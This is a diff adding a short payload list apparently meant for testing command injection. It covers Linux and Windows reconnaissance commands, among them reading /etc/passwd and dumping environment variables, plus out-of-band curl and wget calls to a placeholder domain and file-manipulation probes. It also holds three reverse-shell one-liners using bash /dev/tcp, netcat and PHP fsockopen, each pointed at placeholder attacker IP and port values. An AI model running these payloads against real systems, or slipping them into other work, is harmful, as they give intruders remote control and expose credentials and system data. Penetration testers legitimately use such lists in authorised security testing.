@@ -1,0 +1,35 @@
+# Basic Command Execution
+id
+whoami
+uname -a
+hostname
+pwd
+ls
+cat /etc/passwd
+ifconfig
+ps aux
+netstat -an
+env
+
+# Network Interaction
+ping -c 1 yourdomain.com
+curl http://yourdomain.com
+wget http://yourdomain.com
+
+# File Manipulation
+touch /tmp/testfile
+echo 'test' > /tmp/testfile
+cat /tmp/testfile
+rm /tmp/testfile
+
+# Reverse Shells (Use with Caution)
+bash -i >& /dev/tcp/yourip/yourport 0>&1
+nc -e /bin/bash yourip yourport
+php -r '$sock=fsockopen("yourip",yourport);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Windows Specific
+whoami
+dir
+ipconfig
+tasklist
+systeminfo
